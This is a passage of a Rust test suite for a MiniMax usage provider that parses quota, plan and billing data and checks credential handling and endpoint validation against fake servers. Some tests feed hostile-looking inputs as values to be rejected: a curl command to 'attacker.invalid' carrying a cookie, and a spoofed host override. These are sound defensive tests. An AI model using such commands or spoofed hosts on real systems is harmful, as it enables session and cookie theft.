use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use oab_domain::{AccountKey, AccountScope, ErrorKind, ProviderId, ProviderInstanceId, Timestamp};
use oab_providers::browser_cookie::DisabledChromiumCookieDecryptor;
use oab_providers::browser_profile::{BrowserProfileDiscovery, BrowserProfileRoots};
use oab_providers::capability::ProviderCapability;
use oab_providers::context::ProviderContext;
use oab_providers::descriptor::ProviderSource;
use oab_providers::providers::minimax::{
    MiniMaxProvider, MiniMaxRegion, MiniMaxRouteSet, parse_usage_response,
};
use oab_providers::registry::descriptor_for;
use oab_test_support::http::{CapturedHttpRequest, FakeHttpResponse, FakeHttpServer};
use rusqlite::{Connection, params};
use rust_decimal::Decimal;
use time::{OffsetDateTime, UtcOffset};
use tokio_util::sync::CancellationToken;

const NORMAL: &[u8] = include_bytes!("../../../fixtures/providers/minimax/token-plan-normal.json");
const BOOSTED: &[u8] =
    include_bytes!("../../../fixtures/providers/minimax/token-plan-boosted.json");
const MULTI_SERVICE: &[u8] =
    include_bytes!("../../../fixtures/providers/minimax/multi-service.json");
const BILLING: &[u8] = include_bytes!("../../../fixtures/providers/minimax/billing-page.json");
const NOW_SECONDS: i64 = 1_780_282_340;
const API_TOKEN: &str = "minimax-api-token-fixture-canary-0123456789";
const BROWSER_TOKEN_A: &str =
    "minimax-browser-token-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const BROWSER_TOKEN_B: &str =
    "minimax-browser-token-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

static NEXT_DIRECTORY: AtomicU64 = AtomicU64::new(0);

struct TestDirectory(PathBuf);

impl TestDirectory {
    fn new() -> Self {
        let sequence = NEXT_DIRECTORY.fetch_add(1, Ordering::Relaxed);
        let path = std::env::temp_dir().join(format!(
            "omarchy-ai-bar-minimax-{}-{sequence}",
            std::process::id()
        ));
        fs::create_dir_all(&path).expect("create MiniMax fixture root");
        Self(path)
    }

    fn directory(&self, relative: impl AsRef<Path>) -> PathBuf {
        let path = self.0.join(relative);
        fs::create_dir_all(&path).expect("create MiniMax fixture directory");
        path
    }

    fn write(&self, relative: impl AsRef<Path>, bytes: impl AsRef<[u8]>) {
        let path = self.0.join(relative);
        fs::create_dir_all(path.parent().expect("fixture parent")).expect("create fixture parent");
        fs::write(path, bytes).expect("write MiniMax fixture");
    }

    fn discovery(&self) -> BrowserProfileDiscovery {
        let roots = BrowserProfileRoots::new(
            self.0.join("home"),
            self.0.join("home/config"),
            None::<&Path>,
        )
        .expect("browser roots");
        BrowserProfileDiscovery::with_roots(roots)
    }
}

impl Drop for TestDirectory {
    fn drop(&mut self) {
        let _ignored = fs::remove_dir_all(&self.0);
    }
}

fn timestamp(seconds: i64) -> Timestamp {
    Timestamp::from_unix_timestamp(seconds).expect("fixture timestamp")
}

fn scope(account: &str) -> AccountScope {
    provider_scope(ProviderId::MiniMax, account)
}

fn provider_scope(provider: ProviderId, account: &str) -> AccountScope {
    AccountScope::new(
        provider,
        ProviderInstanceId::new(format!("{provider}-primary")).expect("provider instance"),
        AccountKey::new(account).expect("account key"),
    )
}

fn context(account: &str, source: ProviderSource) -> ProviderContext {
    ProviderContext::new(scope(account), source, CancellationToken::new())
}

fn routes(global: &FakeHttpServer, china: &FakeHttpServer) -> MiniMaxRouteSet {
    let global = global.url("/");
    let china = china.url("/");
    MiniMaxRouteSet::loopback(&global, &china).expect("loopback MiniMax routes")
}

fn assert_percent(actual: f64, expected: f64) {
    assert!((actual - expected).abs() < 1e-9, "{actual} != {expected}");
}

fn valid_usage_with_noise(noise: &str) -> String {
    format!(
        r#"{{
          "noise":{noise},
          "base_resp":{{"status_code":0}},
          "model_remains":[{{
            "model_name":"general",
            "current_interval_status":1,
            "current_interval_remaining_percent":75
          }}]
        }}"#
    )
}

fn billing_page(
    record_count: usize,
    total_count: usize,
    created_at: i64,
    tokens: i64,
    cash: &str,
) -> Vec<u8> {
    let records = (0..record_count)
        .map(|_| {
            serde_json::json!({
                "created_at": created_at,
                "consume_token": tokens,
                "consume_cash_after_voucher": cash,
                "method": "chat",
                "model": "MiniMax-M1",
                "status": "SUCCESS"
            })
        })
        .collect::<Vec<_>>();
    serde_json::to_vec(&serde_json::json!({
        "total_cnt": total_count,
        "charge_records": records
    }))
    .expect("billing page JSON")
}

fn assert_manual_web_requests(requests: &[CapturedHttpRequest], origin: &str) {
    assert_eq!(requests.len(), 3);
    assert_eq!(
        requests[0].target(),
        "/user-center/payment/coding-plan?cycle_type=3"
    );
    assert_eq!(
        requests[1].target(),
        "/v1/api/openplatform/coding_plan/remains?GroupId=12345"
    );
    assert_eq!(
        requests[2].target(),
        "/v1/api/openplatform/charge/combo/cycle_audio_resource_package?biz_line=2&cycle_type=3&resource_package_type=7"
    );
    assert_eq!(
        requests[0].header("accept-language"),
        Some("en-US,en;q=0.9")
    );
    assert_eq!(
        requests[1].header("x-requested-with"),
        Some("XMLHttpRequest")
    );
    assert_eq!(
        requests[2].header("accept-language"),
        Some("zh-CN,zh;q=0.9")
    );
    assert_eq!(requests[2].header("x-group-id"), Some("12345"));
    assert_eq!(requests[0].header("origin"), Some(origin));
    assert_eq!(
        requests[0].header("authorization"),
        Some("Bearer manual-bearer-canary-0123456789")
    );
    assert_eq!(
        requests[1].header("authorization"),
        Some("Bearer manual-bearer-canary-0123456789")
    );
    assert_eq!(requests[2].header("authorization"), None);
    assert!(requests.iter().all(|request| {
        request
            .header("cookie")
            .is_some_and(|cookie| cookie.contains("manual-session-canary"))
    }));
}

#[test]
fn golden_percent_plan_points_resets_and_provenance_match_baseline() {
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        NORMAL,
        ProviderSource::ApiKey,
    )
    .expect("normal token plan fixture");

    let interval = sample.primary().expect("interval quota");
    let weekly = sample.secondary().expect("weekly quota");
    assert_percent(
        interval.used_percent().expect("interval percentage").get(),
        4.0,
    );
    assert_percent(weekly.used_percent().expect("weekly percentage").get(), 1.0);
    assert_eq!(
        interval.duration().expect("5-hour duration").seconds(),
        18_000
    );
    assert_eq!(
        weekly.duration().expect("weekly duration").seconds(),
        604_800
    );
    assert_eq!(
        interval
            .resets_at()
            .expect("interval reset")
            .unix_timestamp(),
        1_780_297_200
    );
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("plan name")
            .as_str(),
        "Token Plan Plus"
    );
    let points = sample.cost().expect("points balance");
    assert_eq!(points.used().amount().get(), Decimal::new(1_750, 2));
    assert_eq!(points.period(), Some("MiniMax points balance"));
    assert_eq!(sample.provenance()[0].source(), "minimax");
    assert_eq!(sample.provenance()[0].strategy(), "api");

    let rows = sample.detail_sections()[0].rows();
    assert_eq!(rows[0].label(), "General · 5 hours");
    assert_eq!(rows[0].value(), "4 / 100");
    assert_eq!(rows[1].label(), "General · Weekly");
    assert_eq!(rows[1].value(), "1 / 100");
}

#[test]
fn boosted_permille_unavailable_placeholder_and_inferred_plus_are_exact() {
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(1_782_050_596),
        BOOSTED,
        ProviderSource::ManualCookie,
    )
    .expect("boosted token plan fixture");
    assert_percent(
        sample
            .primary()
            .expect("interval")
            .used_percent()
            .expect("interval percentage")
            .get(),
        0.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("weekly percentage")
            .get(),
        30.0,
    );
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("inferred plan")
            .as_str(),
        "Plus"
    );
    let rows = sample.detail_sections()[0].rows();
    assert_eq!(rows.len(), 2, "unavailable video placeholders are omitted");
    assert_eq!(rows[0].value(), "0 / 100");
    assert_eq!(rows[1].value(), "45 / 150");
    assert_eq!(sample.provenance()[0].strategy(), "manual");
}

#[test]
fn count_quota_treats_usage_count_as_remaining_and_missing_reset_stays_optional() {
    let response = br#"{
      "base_resp":{"status_code":0},
      "current_subscribe_title":"Max",
      "model_remains":[{
        "model_name":"general",
        "current_interval_total_count":1000,
        "current_interval_usage_count":250,
        "current_interval_status":1
      }]
    }"#;
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        response,
        ProviderSource::BrowserSession,
    )
    .expect("count quota");
    assert_percent(
        sample
            .primary()
            .expect("count quota")
            .used_percent()
            .expect("count percentage")
            .get(),
        75.0,
    );
    assert!(sample.primary().expect("count quota").resets_at().is_none());
    assert_eq!(sample.detail_sections()[0].rows()[0].value(), "750 / 1,000");
    assert_eq!(sample.provenance()[0].strategy(), "browser");
}

#[test]
fn camel_case_next_data_float_integers_and_optional_negative_points_match_baseline() {
    let response = br#"{
      "baseResp":{"status_code":0},
      "currentSubscribeTitle":"Camel Max",
      "pointsBalance":"17.5",
      "modelRemains":[{
        "model_name":"general",
        "current_interval_total_count":1000.9,
        "current_interval_usage_count":250.9,
        "current_interval_status":1
      }]
    }"#;
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        response,
        ProviderSource::ManualCookie,
    )
    .expect("camel-case hydrated payload");
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("camel-case plan")
            .as_str(),
        "Camel Max"
    );
    assert_percent(
        sample
            .primary()
            .expect("float count quota")
            .used_percent()
            .expect("float count percentage")
            .get(),
        75.0,
    );
    assert_eq!(
        sample
            .cost()
            .expect("camel-case points")
            .used()
            .amount()
            .get(),
        Decimal::new(175, 1)
    );

    let negative_points = br#"{
      "base_resp":{"status_code":0},
      "points_balance":-1,
      "model_remains":[{
        "model_name":"general",
        "current_interval_status":1,
        "current_interval_remaining_percent":75
      }]
    }"#;
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        negative_points,
        ProviderSource::ApiKey,
    )
    .expect("negative optional points do not discard quota");
    assert!(sample.primary().is_some());
    assert!(sample.cost().is_none());

    let auth = br#"{
      "baseResp":{"status_code":1004,"status_msg":"cookie expired"},
      "modelRemains":[{
        "model_name":"general",
        "current_interval_remaining_percent":75
      }]
    }"#;
    assert_eq!(
        parse_usage_response(
            scope("account-a"),
            timestamp(NOW_SECONDS),
            auth,
            ProviderSource::BrowserSession,
        )
        .expect_err("camel-case auth envelope")
        .kind(),
        ErrorKind::AuthenticationExpired
    );
}

#[test]
fn status_three_weekly_general_is_unlimited_but_other_placeholders_are_absent() {
    let response = br#"{
      "base_resp":{"status_code":0},
      "model_remains":[
        {
          "model_name":"general",
          "current_interval_status":1,
          "current_interval_remaining_percent":80,
          "current_weekly_status":3,
          "current_weekly_remaining_percent":100
        },
        {
          "model_name":"video",
          "current_interval_status":3,
          "current_interval_remaining_percent":100
        }
      ]
    }"#;
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        response,
        ProviderSource::ApiKey,
    )
    .expect("unlimited weekly quota");
    assert_percent(
        sample
            .secondary()
            .expect("unlimited weekly")
            .used_percent()
            .expect("known percent")
            .get(),
        0.0,
    );
    let rows = sample.detail_sections()[0].rows();
    assert_eq!(rows.len(), 2);
    assert_eq!(rows[1].value(), "Unlimited");
    assert!(
        rows[1]
            .secondary_value()
            .is_some_and(|text| text.contains("Unlimited"))
    );
}

#[test]
fn multi_service_maps_model_names_orders_windows_and_retains_extras() {
    let sample = parse_usage_response(
        scope("account-a"),
        timestamp(1_781_488_000),
        MULTI_SERVICE,
        ProviderSource::ManualCookie,
    )
    .expect("multi-service fixture");
    assert_percent(
        sample
            .primary()
            .expect("text generation")
            .used_percent()
            .expect("text percentage")
            .get(),
        20.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("text to speech")
            .used_percent()
            .expect("speech percentage")
            .get(),
        25.0,
    );
    assert_percent(
        sample
            .tertiary()
            .expect("music generation")
            .used_percent()
            .expect("music percentage")
            .get(),
        20.0,
    );
    assert_eq!(sample.extra_windows().len(), 1);
    assert_percent(
        sample.extra_windows()[0]
            .window()
            .used_percent()
            .expect("image percentage")
            .get(),
        35.0,
    );
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("service inferred plan")
            .as_str(),
        "text_generation_pro"
    );
}

#[test]
fn envelopes_sources_scope_and_json_bounds_fail_closed() {
    for (body, kind) in [
        (
            br#"{"base_resp":{"status_code":1004,"status_msg":"private cookie"}}"#.as_slice(),
            ErrorKind::AuthenticationExpired,
        ),
        (
            br#"{"base_resp":{"status_code":500,"status_msg":"private server"}}"#.as_slice(),
            ErrorKind::Api,
        ),
        (br#"{"model_remains":[]}"#.as_slice(), ErrorKind::Parse),
        (b"not-json".as_slice(), ErrorKind::Parse),
    ] {
        let error = parse_usage_response(
            scope("account-a"),
            timestamp(NOW_SECONDS),
            body,
            ProviderSource::ApiKey,
        )
        .expect_err("invalid response");
        assert_eq!(error.kind(), kind);
        assert!(!format!("{error:?}").contains("private"));
    }

    let positive = valid_usage_with_noise(r#"{"ignored":true}"#);
    parse_usage_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        positive.as_bytes(),
        ProviderSource::ApiKey,
    )
    .expect("unknown shallow fields are accepted");

    let deep_noise = format!("{}0{}", "[".repeat(50), "]".repeat(50));
    let node_noise = format!("[{}]", "0,".repeat(65_536));
    let string_noise = format!(r#""{}""#, "x".repeat(512 * 1024 + 1));
    let body_noise = format!(r#""{}""#, "x".repeat(4 * 1024 * 1024));
    for (noise, label) in [
        (deep_noise, "deep unknown field"),
        (node_noise, "excess unknown nodes"),
        (string_noise, "oversized unknown string"),
        (body_noise, "oversized otherwise-valid body"),
    ] {
        let body = valid_usage_with_noise(&noise);
        assert_eq!(
            parse_usage_response(
                scope("account-a"),
                timestamp(NOW_SECONDS),
                body.as_bytes(),
                ProviderSource::ApiKey,
            )
            .expect_err(label)
            .kind(),
            ErrorKind::Parse
        );
    }
    assert_eq!(
        parse_usage_response(
            provider_scope(ProviderId::Mistral, "account-a"),
            timestamp(NOW_SECONDS),
            NORMAL,
            ProviderSource::ApiKey,
        )
        .expect_err("wrong provider scope")
        .kind(),
        ErrorKind::Api
    );
    assert_eq!(
        parse_usage_response(
            scope("account-a"),
            timestamp(NOW_SECONDS),
            NORMAL,
            ProviderSource::OAuth,
        )
        .expect_err("unsupported source")
        .kind(),
        ErrorKind::Api
    );
}

#[tokio::test]
async fn api_global_auth_falls_back_legacy_then_china_with_exact_headers() {
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(401, Vec::new()),
        FakeHttpResponse::new(401, Vec::new()),
    ])
    .await;
    let china = FakeHttpServer::start([FakeHttpResponse::new(200, NORMAL.to_vec())]).await;
    let provider = MiniMaxProvider::from_api_key_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        API_TOKEN,
        routes(&global, &china),
    )
    .expect("API provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ApiKey),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("regional fallback");
    assert_percent(
        sample
            .primary()
            .expect("interval")
            .used_percent()
            .expect("percentage")
            .get(),
        4.0,
    );
    assert_eq!(
        global
            .requests()
            .iter()
            .map(CapturedHttpRequest::target)
            .collect::<Vec<_>>(),
        [
            "/v1/token_plan/remains",
            "/v1/api/openplatform/coding_plan/remains"
        ]
    );
    assert_eq!(china.requests()[0].target(), "/v1/token_plan/remains");
    let authorization = format!("Bearer {API_TOKEN}");
    for request in global.requests().into_iter().chain(china.requests()) {
        assert_eq!(request.method(), "GET");
        assert_eq!(
            request.header("authorization"),
            Some(authorization.as_str())
        );
        assert_eq!(request.header("accept"), Some("application/json"));
        assert_eq!(request.header("content-type"), Some("application/json"));
        assert_eq!(request.header("mm-api-source"), Some("omarchy-ai-bar"));
    }
}

#[tokio::test]
async fn explicit_china_is_region_independent_and_does_not_retry_global() {
    let global = FakeHttpServer::start([FakeHttpResponse::new(500, Vec::new())]).await;
    let china = FakeHttpServer::start([FakeHttpResponse::new(200, NORMAL.to_vec())]).await;
    let provider = MiniMaxProvider::from_api_key_routes(
        scope("account-a"),
        MiniMaxRegion::ChinaMainland,
        API_TOKEN,
        routes(&global, &china),
    )
    .expect("China API provider");
    provider
        .fetch_at(
            &context("account-a", ProviderSource::ApiKey),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("China fetch");
    assert!(global.requests().is_empty());
    assert_eq!(china.requests().len(), 1);
}

#[tokio::test]
async fn api_environment_precedence_source_isolation_and_secret_redaction() {
    let global = FakeHttpServer::start([FakeHttpResponse::new(200, NORMAL.to_vec())]).await;
    let china = FakeHttpServer::start([]).await;
    let mut environment = BTreeMap::new();
    environment.insert(
        "MINIMAX_CODING_API_KEY".to_owned(),
        "coding-token-precedence-canary".to_owned(),
    );
    environment.insert(
        "MINIMAX_API_KEY".to_owned(),
        "generic-token-must-not-win".to_owned(),
    );
    let provider = MiniMaxProvider::from_api_environment_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        &environment,
        routes(&global, &china),
    )
    .expect("environment provider");
    provider
        .fetch_at(
            &context("account-a", ProviderSource::ApiKey),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("environment fetch");
    assert_eq!(
        global.requests()[0].header("authorization"),
        Some("Bearer coding-token-precedence-canary")
    );
    let error = provider
        .fetch_at(
            &context("account-b", ProviderSource::ApiKey),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("account isolation");
    assert_eq!(error.kind(), ErrorKind::Api);
    assert!(!format!("{provider:?}").contains("coding-token"));
}

#[tokio::test]
async fn standard_api_keys_are_rejected_before_transport_but_coding_and_unknown_keys_work() {
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(200, NORMAL.to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let route_set = routes(&global, &china);
    let error = MiniMaxProvider::from_api_key_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "sk-api-standard-key-must-not-be-sent",
        route_set,
    )
    .expect_err("standard MiniMax keys are not Coding Plan keys");
    assert_eq!(error.kind(), ErrorKind::MissingCredential);
    assert!(global.requests().is_empty());

    for token in [
        "sk-cp-coding-plan-key-fixture",
        "opaque-unknown-prefix-key-fixture",
    ] {
        let provider = MiniMaxProvider::from_api_key_routes(
            scope("account-a"),
            MiniMaxRegion::Global,
            token,
            routes(&global, &china),
        )
        .expect("supported Coding Plan key kind");
        provider
            .fetch_at(
                &context("account-a", ProviderSource::ApiKey),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect("supported key reaches transport");
    }
    assert_eq!(global.requests().len(), 2);

    let mut environment = BTreeMap::new();
    environment.insert(
        "MINIMAX_CODING_API_KEY".to_owned(),
        "sk-api-primary-must-not-fall-through".to_owned(),
    );
    environment.insert(
        "MINIMAX_API_KEY".to_owned(),
        "sk-cp-secondary-must-not-win".to_owned(),
    );
    let error = MiniMaxProvider::from_api_environment_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        &environment,
        routes(&global, &china),
    )
    .expect_err("first configured standard key remains authoritative");
    assert_eq!(error.kind(), ErrorKind::MissingCredential);
    assert_eq!(global.requests().len(), 2);
}

#[test]
fn injected_environment_resolves_cookie_fallback_and_typed_https_routes() {
    let mut environment = BTreeMap::new();
    environment.insert(
        "MINIMAX_HOST".to_owned(),
        "https://proxy.example.test:8443/ignored/path".to_owned(),
    );
    environment.insert(
        "MINIMAX_COOKIE".to_owned(),
        "curl 'https://attacker.invalid' -H 'Cookie: bad=primary'".to_owned(),
    );
    environment.insert(
        "MINIMAX_COOKIE_HEADER".to_owned(),
        "HERTZ-SESSION=environment-cookie-canary".to_owned(),
    );
    let routes = MiniMaxRouteSet::production_with_environment(MiniMaxRegion::Global, &environment)
        .expect("custom HTTPS host");
    let resolved = routes.resolved_web_routes(MiniMaxRegion::Global);
    assert_eq!(
        resolved.coding_plan().as_str(),
        "https://proxy.example.test:8443/user-center/payment/coding-plan?cycle_type=3"
    );
    assert_eq!(
        resolved.remains().as_str(),
        "https://proxy.example.test:8443/v1/api/openplatform/coding_plan/remains"
    );
    assert_eq!(
        resolved.billing_history().as_str(),
        "https://proxy.example.test:8443/account/amount"
    );
    assert_eq!(resolved.combo().host_str(), Some("proxy.example.test"));
    let provider = MiniMaxProvider::from_manual_environment(
        scope("account-a"),
        MiniMaxRegion::Global,
        &environment,
    )
    .expect("invalid primary cookie falls through to valid secondary");
    assert_eq!(provider.source(), ProviderSource::ManualCookie);
    assert!(!format!("{provider:?}").contains("environment-cookie-canary"));

    let mut specific = BTreeMap::new();
    specific.insert(
        "MINIMAX_CODING_PLAN_URL".to_owned(),
        "proxy.example.test/custom/coding?cycle_type=9&safe=1".to_owned(),
    );
    specific.insert(
        "MINIMAX_REMAINS_URL".to_owned(),
        "https://[::1]:8443/custom/remains".to_owned(),
    );
    specific.insert(
        "MINIMAX_BILLING_HISTORY_URL".to_owned(),
        "https://billing.example.test/custom?tenant=fixture".to_owned(),
    );
    let routes =
        MiniMaxRouteSet::production_with_environment(MiniMaxRegion::ChinaMainland, &specific)
            .expect("independent HTTPS route overrides");
    let resolved = routes.resolved_web_routes(MiniMaxRegion::ChinaMainland);
    assert_eq!(
        resolved.coding_plan().as_str(),
        "https://proxy.example.test/custom/coding?cycle_type=9&safe=1"
    );
    assert_eq!(
        resolved.coding_plan_referer().as_str(),
        "https://proxy.example.test/custom/coding"
    );
    assert_eq!(resolved.remains().host_str(), Some("[::1]"));
    assert_eq!(resolved.remains().port(), Some(8443));
    assert_eq!(resolved.billing_history().query(), Some("tenant=fixture"));
}

#[test]
fn injected_environment_rejects_unsafe_or_strict_foreign_endpoints_before_browser_data() {
    for (key, value) in [
        ("MINIMAX_HOST", "http://proxy.example.test"),
        (
            "MINIMAX_REMAINS_URL",
            "https://user:password@proxy.example.test/remains",
        ),
        (
            "MINIMAX_CODING_PLAN_URL",
            "https://proxy.example.test/coding?access_token=secret",
        ),
        (
            "MINIMAX_BILLING_HISTORY_URL",
            "https://attacker.example%2f.platform.minimax.io/account/amount",
        ),
    ] {
        let environment = BTreeMap::from([(key.to_owned(), value.to_owned())]);
        let error =
            MiniMaxRouteSet::production_with_environment(MiniMaxRegion::Global, &environment)
                .expect_err("unsafe endpoint override");
        assert_eq!(error.kind(), ErrorKind::Api);
    }

    let strict = BTreeMap::from([
        (
            "MINIMAX_REQUIRE_PROVIDER_ENDPOINT_OVERRIDES".to_owned(),
            "yes".to_owned(),
        ),
        ("MINIMAX_HOST".to_owned(), "proxy.example.test".to_owned()),
    ]);
    assert_eq!(
        MiniMaxProvider::new_browser_with_environment(
            scope("account-a"),
            MiniMaxRegion::Global,
            &strict,
            &BrowserProfileDiscovery::disabled(),
            OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
        )
        .expect_err("endpoint validation precedes disabled browser discovery")
        .kind(),
        ErrorKind::Api
    );

    let owned = BTreeMap::from([
        (
            "MINIMAX_REQUIRE_PROVIDER_ENDPOINT_OVERRIDES".to_owned(),
            "true".to_owned(),
        ),
        (
            "MINIMAX_HOST".to_owned(),
            "edge.platform.minimax.io:9443".to_owned(),
        ),
    ]);
    MiniMaxRouteSet::production_with_environment(MiniMaxRegion::Global, &owned)
        .expect("strict provider-owned suffix");

    let fixture = TestDirectory::new();
    fixture.directory("home");
    fixture.directory("home/config");
    let profile = "home/config/chromium/Default";
    fixture.directory(profile);
    write_cookie_database(&fixture, profile, "environment-browser-cookie");
    let custom = BTreeMap::from([(
        "MINIMAX_HOST".to_owned(),
        "https://proxy.example.test:8443".to_owned(),
    )]);
    let provider = MiniMaxProvider::new_browser_with_environment(
        scope("account-a"),
        MiniMaxRegion::Global,
        &custom,
        &fixture.discovery(),
        OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
    )
    .expect("browser environment constructor");
    assert_eq!(provider.source(), ProviderSource::BrowserSession);
}

#[tokio::test]
async fn manual_web_enriches_html_with_remains_and_subscription_metadata() {
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(
            200,
            b"<html><main>Coding Plan Plus available usage 1000 prompts / 5 hours</main></html>"
                .to_vec(),
        )
        .header("content-type", "text/html; charset=utf-8"),
        FakeHttpResponse::new(200, NORMAL.to_vec()).header("content-type", "application/json"),
        FakeHttpResponse::new(
            200,
            br#"{
              "base_resp":{"status_code":0},
              "current_subscription":{
                "name":"TokenPlanMax",
                "current_subscribe_end_time_ts":1782000000,
                "renewal_trigger_time_ts":1781900000
              }
            }"#
            .to_vec(),
        ),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let capture = concat!(
        "curl 'https://platform.minimax.io/user-center/payment/coding-plan?gRoUpId=12345' ",
        "-H 'Cookie: HERTZ-SESSION=manual-session-canary' ",
        "-H 'Authorization: Bearer manual-bearer-canary-0123456789'"
    );
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        capture,
        routes(&global, &china),
    )
    .expect("manual web provider")
    .with_billing_history(false);
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("web enrichment");

    assert_percent(
        sample
            .primary()
            .expect("remains interval")
            .used_percent()
            .expect("interval percentage")
            .get(),
        4.0,
    );
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("subscription plan")
            .as_str(),
        "TokenPlanMax"
    );
    assert_eq!(
        sample
            .subscription_expires_at()
            .expect("subscription expiry")
            .unix_timestamp(),
        1_782_000_000
    );
    assert_eq!(
        sample
            .subscription_renews_at()
            .expect("subscription renewal")
            .unix_timestamp(),
        1_781_900_000
    );

    assert_manual_web_requests(&global.requests(), &global.origin());
}

#[tokio::test]
async fn hydrated_camel_case_html_is_parsed() {
    let next_data = br#"<html><script id="__NEXT_DATA__" type="application/json">{
      "props":{"pageProps":{"quota":{
        "baseResp":{"status_code":0},
        "currentSubscribeTitle":"Hydrated Ultra",
        "creditsBalance":42,
        "modelRemains":[{
          "model_name":"general",
          "current_interval_status":1,
          "current_interval_remaining_percent":80
        }]
      }}}
    }</script></html>"#;
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, next_data.to_vec()).header("content-type", "text/html")
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=hydrated-html-canary",
        routes(&global, &china),
    )
    .expect("hydrated HTML provider")
    .with_billing_history(false);
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("camel-case next data");
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("hydrated plan")
            .as_str(),
        "Hydrated Ultra"
    );
    assert_percent(
        sample
            .primary()
            .expect("hydrated quota")
            .used_percent()
            .expect("hydrated percent")
            .get(),
        20.0,
    );
    assert_eq!(
        sample
            .cost()
            .expect("hydrated credits")
            .used()
            .amount()
            .get(),
        Decimal::from(42)
    );
    assert_eq!(global.requests().len(), 1);
}

#[tokio::test]
async fn raw_plan_and_reset_time_html_fallbacks_are_parsed() {
    let raw_html = br#"<html>
      <script>window.__plan={"packageName":"Raw Package Max"};</script>
      <main>Available usage: 1,500 prompts / 1.5 hours Used 75% Resets at 23:30 (UTC)</main>
    </html>"#;
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, raw_html.to_vec()).header("content-type", "text/html"),
        FakeHttpResponse::truncated(200, 20, b"{".to_vec()),
        FakeHttpResponse::truncated(200, 20, b"{".to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=raw-html-canary",
        routes(&global, &china),
    )
    .expect("raw HTML provider")
    .with_billing_history(false);
    let fetched_at = timestamp(1_735_725_600); // 2025-01-01 10:00:00 UTC.
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            fetched_at,
        )
        .await
        .expect("raw HTML fallbacks");
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("raw package plan")
            .as_str(),
        "Raw Package Max"
    );
    assert_eq!(
        sample
            .primary()
            .expect("raw HTML quota")
            .duration()
            .expect("ninety-minute window")
            .seconds(),
        5_400
    );
    assert_eq!(
        sample
            .primary()
            .expect("raw HTML quota")
            .resets_at()
            .expect("UTC clock reset")
            .unix_timestamp(),
        1_735_774_200
    );
}

#[tokio::test]
async fn web_billing_aggregates_successes_and_excludes_failed_records() {
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()).header("content-type", "application/json"),
        FakeHttpResponse::new(200, BILLING.to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=billing-session-canary",
        routes(&global, &china),
    )
    .expect("billing provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(1_781_481_600),
        )
        .await
        .expect("billing fetch");

    let history = sample.cost_usage().expect("typed billing history");
    assert_eq!(history.history_days(), 30);
    assert!(history.history_coverage_is_established());
    assert_eq!(history.history().total_tokens(), Some(2_500));
    assert_eq!(history.session().total_tokens(), Some(2_000));
    assert_eq!(
        history.history().amount().expect("history cash").get(),
        Decimal::new(250, 2)
    );
    assert_eq!(history.daily().len(), 2);
    assert_eq!(history.daily()[0].day(), "2026-06-14");
    assert_eq!(history.daily()[1].day(), "2026-06-15");
    assert_eq!(history.daily()[1].models()[0].name(), "MiniMax-M1");

    let billing = sample
        .detail_sections()
        .iter()
